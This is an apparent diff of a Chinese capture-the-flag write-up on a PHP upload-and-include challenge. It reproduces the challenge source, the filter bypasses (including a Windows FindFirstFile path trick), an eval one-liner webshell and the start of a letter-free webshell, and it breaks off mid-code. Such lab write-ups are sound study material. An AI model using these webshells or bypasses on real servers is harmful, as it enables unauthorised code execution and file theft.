false){<br><br>​        return ["msg" => "blocked by path sanitizer", "type" => "error"];<br><br>​      }<br><br>​      // check if file exists //<br><br>​      if(file_exists($this->dir . $this->filename)){<br><br>​        return ["msg" => "file exists", "type" => "error"];<br><br>​      }<br><br>​      file_put_contents($this->dir . $this->filename, $this->content);<br><br>​      // just check if file is written. hopefully. //<br><br>​      if(@file_get_contents($this->dir . $this->filename) == ""){<br><br>​        return ["msg" => "file not written.", "type" => "error"];<br><br>​      }<br><br>​      return ["type" => "success"];<br><br>​    }<br><br>  }<br></code></pre></td></tr></tbody></table></figure>
+​        if($read_file === $read_file_with_hardened_filter ||
+
+​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){
+
+​          return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​        }
+
+​        // .. and finally, include *un*exploitable file is included. //
+
+​        @include(&quot;./files/&quot; . $this-&gt;filename);
+
+​        return [&quot;type&quot; =&gt; &quot;success&quot;];
+
+​      }else{
+
+​        return [&quot;msg&quot; =&gt; &quot;invalid filename (wtf)&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​      }
+
+​    }
+
+  }</code></pre><h2 id="3-put功能块"><a href="#3-put功能块" class="headerlink" title="3)put功能块"></a>3)put功能块</h2><pre><code>class Put {
+
+​    protected function nanahira(){
+
+​      // senpai notice me //
+
+​      function exploit($data){
+
+​        $exploit = new System();
+
+​      }
+
+​      $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);
+
+​    }
+
+​    private $filename;
+
+​    private $content;
+
+​    private $dir = &quot;./files/&quot;;
+
+​    function __construct($filename, $data){
+
+​      global $seed;
+
+​      if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;])){
+
+​        $this-&gt;filename = (string)$filename;
+
+​      }else{
+
+​        $this-&gt;filename = false;
+
+​      }
+
+​      $this-&gt;content = (string)@code_sanitizer($data[&#39;content&#39;]);
+
+​    }
+
+​    function put(){
+
+​      // just another typical file insertion //
+
+​      if($this-&gt;filename === false){
+
+​        return [&quot;msg&quot; =&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​      }
+
+​      // check if file exists //
+
+​      if(file_exists($this-&gt;dir . $this-&gt;filename)){
+
+​        return [&quot;msg&quot; =&gt; &quot;file exists&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​      }
+
+​      file_put_contents($this-&gt;dir . $this-&gt;filename, $this-&gt;content);
+
+​      // just check if file is written. hopefully. //
+
+​      if(@file_get_contents($this-&gt;dir . $this-&gt;filename) == &quot;&quot;){
+
+​        return [&quot;msg&quot; =&gt; &quot;file not written.&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​      }
+
+​      return [&quot;type&quot; =&gt; &quot;success&quot;];
+
+​    }
+
+  }</code></pre><h2 id="4-过滤函数"><a href="#4-过滤函数" class="headerlink" title="4)过滤函数:"></a>4)过滤函数:</h2><pre><code> function rrmdir($dir, $depth=0){ 
+
+​    if (is_dir($dir)){
+
+​      $objects = scandir($dir); 
+
+​      foreach ($objects as $object){ 
+
+​        if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ 
+
+​          if(is_dir($dir.&quot;/&quot;.$object))
+
+​            rrmdir($dir.&quot;/&quot;.$object, $depth + 1);
+
+​          else
+
+​            unlink($dir.&quot;/&quot;.$object); 
+
+​        }
+
+​      }
+
+​    }
+
+​    if($depth != 0) rmdir($dir); 
+
+  }
+
+  function countdir($dir){
+
+​    if (is_dir($dir)){
+
+​      $objects = scandir($dir);
+
+​      foreach ($objects as $object){ 
+
+​        if ($object != &quot;.&quot; &amp;&amp; $object != &quot;..&quot;){ 
+
+​          $count += 1;
+
+​          if(is_dir($dir.&quot;/&quot;.$object))
+
+​            $count += countdir($dir.&quot;/&quot;.$object);
+
+​        }
+
+​      }
+
+​    }
+
+​    return $count;
+
+  }
+
+  var_dump(countdir(&quot;./files&quot;));
+
+  if(countdir(&quot;./files/&quot;) &gt;= 100) @rrmdir(&quot;./files/&quot;);
 
 
 
+  // Here, kawaii path-san for you! //
+
+  function path_sanitizer($dir, $harden=false){
+
+​    $dir = (string)$dir;
+
+​    $dir_len = strlen($dir);
+
+​    // Deny LFI/RFI/XSS //
+
+​    $filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;];
+
+​    foreach($filter as $f){
+
+​      if(stripos($dir, $f) !== false){
+
+​        return false;
+
+​      }
+
+​    }
+
+​    // Deny SSRF and all possible weird bypasses //
+
+​    $stream = stream_get_wrappers();
+
+​    $stream = array_merge($stream, stream_get_transports());
+
+​    $stream = array_merge($stream, stream_get_filters());
+
+​    foreach($stream as $f){
+
+​      $f_len = strlen($f);
+
+​      if(substr($dir, 0, $f_len) === $f){
+
+​        return false;
+
+​      }
+
+​    }
+
+​    // Deny length //
+
+​    if($dir_len &gt;= 128){
+
+​      return false;
+
+​    }
+
+​    // Easy level hardening //
+
+​    if($harden){
+
+​      $harden_filter = [&quot;/&quot;, &quot;\\&quot;];
+
+​      foreach($harden_filter as $f){
+
+​        $dir = str_replace($f, &quot;&quot;, $dir);
+
+​      }
+
+​    }
 
 
-<h2 id="4-过滤函数">4)过滤函数:<a class="post-anchor" href="#4-过滤函数"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs plain"> function rrmdir($dir, $depth=0){ <br><br>​    if (is_dir($dir)){<br><br>​      $objects = scandir($dir); <br><br>​      foreach ($objects as $object){ <br><br>​        if ($object != "." && $object != ".."){ <br><br>​          if(is_dir($dir."/".$object))<br><br>​            rrmdir($dir."/".$object, $depth + 1);<br><br>​          else<br><br>​            unlink($dir."/".$object); <br><br>​        }<br><br>​      }<br><br>​    }<br><br>​    if($depth != 0) rmdir($dir); <br><br>  }<br><br>  function countdir($dir){<br><br>​    if (is_dir($dir)){<br><br>​      $objects = scandir($dir);<br><br>​      foreach ($objects as $object){ <br><br>​        if ($object != "." && $object != ".."){ <br><br>​          $count += 1;<br><br>​          if(is_dir($dir."/".$object))<br><br>​            $count += countdir($dir."/".$object);<br><br>​        }<br><br>​      }<br><br>​    }<br><br>​    return $count;<br><br>  }<br><br>  var_dump(countdir("./files"));<br><br>  if(countdir("./files/") >= 100) @rrmdir("./files/");<br><br> <br><br>  // Here, kawaii path-san for you! //<br><br>  function path_sanitizer($dir, $harden=false){<br><br>​    $dir = (string)$dir;<br><br>​    $dir_len = strlen($dir);<br><br>​    // Deny LFI/RFI/XSS //<br><br>​    $filter = ['.', './', '~', '.\\', '#', '<', '>'];<br><br>​    foreach($filter as $f){<br><br>​      if(stripos($dir, $f) !== false){<br><br>​        return false;<br><br>​      }<br><br>​    }<br><br>​    // Deny SSRF and all possible weird bypasses //<br><br>​    $stream = stream_get_wrappers();<br><br>​    $stream = array_merge($stream, stream_get_transports());<br><br>​    $stream = array_merge($stream, stream_get_filters());<br><br>​    foreach($stream as $f){<br><br>​      $f_len = strlen($f);<br><br>​      if(substr($dir, 0, $f_len) === $f){<br><br>​        return false;<br><br>​      }<br><br>​    }<br><br>​    // Deny length //<br><br>​    if($dir_len >= 128){<br><br>​      return false;<br><br>​    }<br><br>​    // Easy level hardening //<br><br>​    if($harden){<br><br>​      $harden_filter = ["/", "\\"];<br><br>​      foreach($harden_filter as $f){<br><br>​        $dir = str_replace($f, "", $dir);<br><br>​      }<br><br>​    }<br><br> <br><br>​    // Sanitize feature is available starting from the medium level //<br><br>​    return $dir;<br><br>  }<br><br> <br><br>  // The new kakkoii code-san is re-implemented. //<br><br>  function code_sanitizer($code){<br><br>​    // Computer-chan, please don't speak english. Speak something else! //<br><br>​    $code = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);<br><br>​    return $code;<br><br>  }<br></code></pre></td></tr></tbody></table></figure>
+
+​    // Sanitize feature is available starting from the medium level //
+
+​    return $dir;
+
+  }
 
 
 
-<h2 id="5-还有这段代码">5)还有这段代码:<a class="post-anchor" href="#5-还有这段代码"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plain">@require('flag.php');<br><br>$seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));<br><br> <br><br>if($flag === $_GET['trigger']){<br><br>​    die(hash("sha256", $seed . $flag));<br><br>  }<br><br> <br><br>class System {<br><br>​    function __destruct(){<br><br>​      global $seed;<br><br>​      // ain't Argon2, ain't pbkdf2. what could go wrong?<br><br>​      $flag = hash('sha256', $seed);<br><br>​      if($_GET[$flag]){<br><br>​        @system($_GET[$flag]);<br><br>​      }else{<br><br>​        @unserialize($_SESSION[$flag]);<br><br>​      }<br><br>​    }<br><br>  }<br></code></pre></td></tr></tbody></table></figure>
+  // The new kakkoii code-san is re-implemented. //
+
+  function code_sanitizer($code){
+
+​    // Computer-chan, please don&#39;t speak english. Speak something else! //
+
+​    $code = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\=\(\)\[\]\;]/u&quot;, &quot;*Nope*&quot;, (string)$code);
+
+​    return $code;
+
+  }</code></pre><h2 id="5-还有这段代码"><a href="#5-还有这段代码" class="headerlink" title="5)还有这段代码:"></a>5)还有这段代码:</h2><pre><code>@require(&#39;flag.php&#39;);
+
+$seed = md5(rand(PHP_INT_MIN,PHP_INT_MAX));
 
 
 
-<p>这里是迷惑点,拿不到flag</p>
-<h1 id="2-分析put要过滤的点">2.分析put要过滤的点<a class="post-anchor" href="#2-分析put要过滤的点"></a></h1><p>首先这个条件成立才能put文件</p>
-<p><code>if((string)$filename === (string)@path_sanitizer($data['filename']))</code></p>
+if($flag === $_GET[&#39;trigger&#39;]){
+
+​    die(hash(&quot;sha256&quot;, $seed . $flag));
+
+  }
+
+
+
+class System {
+
+​    function __destruct(){
+
+​      global $seed;
+
+​      // ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong?
+
+​      $flag = hash(&#39;sha256&#39;, $seed);
+
+​      if($_GET[$flag]){
+
+​        @system($_GET[$flag]);
+
+​      }else{
+
+​        @unserialize($_SESSION[$flag]);
+
+​      }
+
+​    }
+
+  }</code></pre><p>这里是迷惑点,拿不到flag</p>
+<h1 id="2-分析put要过滤的点"><a href="#2-分析put要过滤的点" class="headerlink" title="2.分析put要过滤的点"></a>2.分析put要过滤的点</h1><p>首先这个条件成立才能put文件</p>
+<p><code>if((string)$filename === (string)@path_sanitizer($data[&#39;filename&#39;]))</code></p>
 <p>文件名不能包含这些符号</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">$filter = ['.', './', '~', '.\\', '#', '<', '>'];<br><br>​    foreach($filter as $f){<br><br>​      if(stripos($dir, $f) !== false){<br><br>​        return false;<br><br>​      }<br><br>​    }<br></code></pre></td></tr></tbody></table></figure>
+<pre><code>$filter = [&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;];
 
+​    foreach($filter as $f){
 
+​      if(stripos($dir, $f) !== false){
 
-<p>长度限制:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">if($dir_len >= 128){<br><br>​      return false;<br><br>​    }<br></code></pre></td></tr></tbody></table></figure>
+​        return false;
 
+​      }
 
+​    }</code></pre><p>长度限制:</p>
+<pre><code>if($dir_len &gt;= 128){
 
-<p>content的限制:</p>
-<p><code>$code = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "*Nope*", (string)$code);</code></p>
-<p><a href="/CTF/2/1.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/1.png" alt="1"></a></p>
+​      return false;
+
+​    }</code></pre><p>content的限制:</p>
+<p><code>$code = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\=\(\)\[\]\;]/u&quot;, &quot;*Nope*&quot;, (string)$code);</code></p>
+<p><img src="/CTF/2/1.png" alt="1"></p>
 <p>本地测试下:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">$a=@$_POST[a];<br><br>//$a = preg_replace("/[^<>!@#$%\^&*\_?]/u", "h", $a);<br><br>$a = preg_replace("/[^<>!@#$%\^&*\_?+\.\-\\\'\"\=\(\)\[\]\;]/u", "h", $a);<br><br>echo $a;<br></code></pre></td></tr></tbody></table></figure>
+<pre><code>$a=@$_POST[a];
 
+//$a = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?]/u&quot;, &quot;h&quot;, $a);
 
+$a = preg_replace(&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\=\(\)\[\]\;]/u&quot;, &quot;h&quot;, $a);
 
-<p> <a href="/CTF/2/2.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/2.png" alt="1"></a></p>
-<p><a href="/CTF/2/3.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/3.png" alt="1"></a></p>
+echo $a;</code></pre><p> <img src="/CTF/2/2.png" alt="1"></p>
+<p><img src="/CTF/2/3.png" alt="1"></p>
 <p>多了四个 hhhh  输入的字符没有被替换 怎么多了四个hhhh?</p>
 <p>发现</p>
-<p><a href="/CTF/2/4.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/4.png" alt="1"></a></p>
+<p><img src="/CTF/2/4.png" alt="1"></p>
 <p>应该是这样的,它会默认匹配 /r /n 属于一个字节,而汉字匹配的话是两个字节</p>
 <p>所以这样的话就是四个字节了 替换后就变成了四个hhhh</p>
 <p>再输入一个回车试下:</p>
-<p><a href="/CTF/2/5.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/5.png" alt="1"></a></p>
-<p><a href="/CTF/2/6.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/6.png" alt="1"></a></p>
+<p><img src="/CTF/2/5.png" alt="1"></p>
+<p><img src="/CTF/2/6.png" alt="1"></p>
 <p>假如一句话是</p>
-<!--?php eval(@$_REQUEST[a]);?--><p> </p>
+<?php eval(@$_REQUEST[a]);?><p> </p>
 <p>虽然添加了几个字符 但并不影响php代码的执行</p>
 <p>总结来说 就是让上传一个没有字母和数字的webshell</p>
-<h2 id="3-分析get要过滤的点">3.分析get要过滤的点<a class="post-anchor" href="#3-分析get要过滤的点"></a></h2><p>1)这个函数解析url中get参数</p>
-<p>explode(“&”, $_SERVER[‘QUERY_STRING’]);</p>
-<p><a href="/CTF/2/7.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/7.png" alt="1"></a></p>
+<h1 id="3-分析get要过滤的点"><a href="#3-分析get要过滤的点" class="headerlink" title="3.分析get要过滤的点"></a>3.分析get要过滤的点</h1><p>1)这个函数解析url中get参数</p>
+<p>explode(“&amp;”, $_SERVER[‘QUERY_STRING’]);</p>
+<p><img src="/CTF/2/7.png" alt="1"></p>
 <p>2)看过滤点:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">  $read_file = "./files/" . $this->filename;<br><br>​        $read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);<br><br> <br><br>​        if($read_file === $read_file_with_hardened_filter ||<br><br>​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){<br><br>​          return ["msg" => "request blocked", "type" => "error"];<br><br>​        }<br></code></pre></td></tr></tbody></table></figure>
+<pre><code>  $read_file = &quot;./files/&quot; . $this-&gt;filename;
 
-<p>首先看这个函数</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">path_sanitizer($this->filename, true) <br><br>--><br><br>if($harden){<br><br>​      $harden_filter = ["/", "\\"];<br><br>​      foreach($harden_filter as $f){<br><br>​        $dir = str_replace($f, "", $dir);<br><br>​      }<br><br>​    }<br></code></pre></td></tr></tbody></table></figure>
+​        $read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);
 
-<p>它将文件名中 /  \替换为空</p>
+
+
+​        if($read_file === $read_file_with_hardened_filter ||
+
+​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){
+
+​          return [&quot;msg&quot; =&gt; &quot;request blocked&quot;, &quot;type&quot; =&gt; &quot;error&quot;];
+
+​        }</code></pre><p>首先看这个函数</p>
+<pre><code>path_sanitizer($this-&gt;filename, true) 
+
+--&gt;
+
+if($harden){
+
+​      $harden_filter = [&quot;/&quot;, &quot;\\&quot;];
+
+​      foreach($harden_filter as $f){
+
+​        $dir = str_replace($f, &quot;&quot;, $dir);
+
+​      }
+
+​    }</code></pre><p>它将文件名中 /  \替换为空</p>
 <p>然后这个if判断为真的话不能包含文件</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain"> if($read_file === $read_file_with_hardened_filter ||<br><br>​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter))<br></code></pre></td></tr></tbody></table></figure>
+<pre><code> if($read_file === $read_file_with_hardened_filter ||
 
-<p> 也就是说包含的文件名必须加 / 或 \  同时文件内容也是不一样的</p>
-<p>比如上传一个test  然后包含文件时是test\  ->  test不等于test\  并且 file_get_contents(‘test')不等于file_get_contents(‘test’)</p>
+​          @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter))</code></pre><p> 也就是说包含的文件名必须加 / 或 \  同时文件内容也是不一样的</p>
+<p>比如上传一个test  然后包含文件时是test\  -&gt;  test不等于test\  并且 file_get_contents(‘test&#39;)不等于file_get_contents(‘test’)</p>
 <p>那么这个判断就可以绕过了</p>
 <p>现在测试一下</p>
-<p><a href="/CTF/2/8.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/8.png" alt="1"></a></p>
+<p><img src="/CTF/2/8.png" alt="1"></p>
 <p>再包含下</p>
-<p><a href="/CTF/2/9.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/9.png" alt="1"></a></p>
+<p><img src="/CTF/2/9.png" alt="1"></p>
 <p>可以发现  成功include  但是文件内容没有读取 </p>
-<p><code>@include("./files/" . $this->filename);  ->  ./files/test\</code>  它包含的是这个文件</p>
+<p><code>@include(&quot;./files/&quot; . $this-&gt;filename);  -&gt;  ./files/test\</code>  它包含的是这个文件</p>
 <p>而我们上传的文件是这样的:  ./files/test</p>
 <p>所以文件并不能读取</p>
-<h1 id="4-windows-FindFirstFile利用">4.windows  FindFirstFile利用<a class="post-anchor" href="#4-windows-FindFirstFile利用"></a></h1><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain"><?php<br><br>for ($j=0; $j<256; $j++) {<br><br>​		for ($i=0; $i<256; $i++) {<br><br>​				$url = 'flag.p' . chr($j) . chr($i);<br><br>​				$tmp = @file_get_contents($url);<br><br>​				if (!empty($tmp)) echo chr($j) . chr($i) . " ";<br><br>​		}<br><br>}<br><br>?><br></code></pre></td></tr></tbody></table></figure>
+<h1 id="4-windows-FindFirstFile利用"><a href="#4-windows-FindFirstFile利用" class="headerlink" title="4.windows  FindFirstFile利用"></a>4.windows  FindFirstFile利用</h1><pre><code>&lt;?php
 
-<p><a href="/CTF/2/10.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/10.png" alt="1"></a></p>
-<p> <a href="/CTF/2/11.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/11.png" alt="1"></a></p>
-<p><a href="/CTF/2/12.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/12.png" alt="1"></a></p>
+for ($j=0; $j&lt;256; $j++) {
+
+​        for ($i=0; $i&lt;256; $i++) {
+
+​                $url = &#39;flag.p&#39; . chr($j) . chr($i);
+
+​                $tmp = @file_get_contents($url);
+
+​                if (!empty($tmp)) echo chr($j) . chr($i) . &quot; &quot;;
+
+​        }
+
+}
+
+?&gt;</code></pre><p><img src="/CTF/2/10.png" alt="1"></p>
+<p> <img src="/CTF/2/11.png" alt="1"></p>
+<p><img src="/CTF/2/12.png" alt="1"></p>
 <p>本地测试 </p>
-<p><a href="/CTF/2/13.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/13.png" alt="1"></a></p>
+<p><img src="/CTF/2/13.png" alt="1"></p>
 <p>本题环境是 windows</p>
 <p>所以我们可以上传 文件名为  “/test   绕过:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">$read_file = "./files/" . $this->filename;   // ./files/./test<br><br>$read_file_with_hardened_filter = "./files/" . path_sanitizer($this->filename, true);  // ./files/.test<br><br>@file_get_contents($read_file)  //实际获取内容<br><br>@file_get_contents($read_file_with_hardened_filter)  // 文件不存在<br></code></pre></td></tr></tbody></table></figure>
+<pre><code>$read_file = &quot;./files/&quot; . $this-&gt;filename;   // ./files/./test
 
-<p> <a href="/CTF/2/14.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/14.png" alt="1"></a></p>
-<p> <a href="/CTF/2/15.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/15.png" alt="1"></a></p>
+$read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);  // ./files/.test
+
+@file_get_contents($read_file)  //实际获取内容
+
+@file_get_contents($read_file_with_hardened_filter)  // 文件不存在</code></pre><p> <img src="/CTF/2/14.png" alt="1"></p>
+<p> <img src="/CTF/2/15.png" alt="1"></p>
 <p>5.最后就是构造无数字字母的webshell</p>
-<!--?php readfile('flag.php');?-->
+<?php readfile('flag.php');?>
 
 <p>看P牛文章:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
 <p>在构造前先理解下自增运算符拿shell的原理</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs plain"><?php<br><br>$_=[];<br><br>$_=@"$_"; // $_='Array';<br><br>$_=$_['!'=='@']; // $_=$_[0];<br><br>$___=$_; // A<br><br>$__=$_; 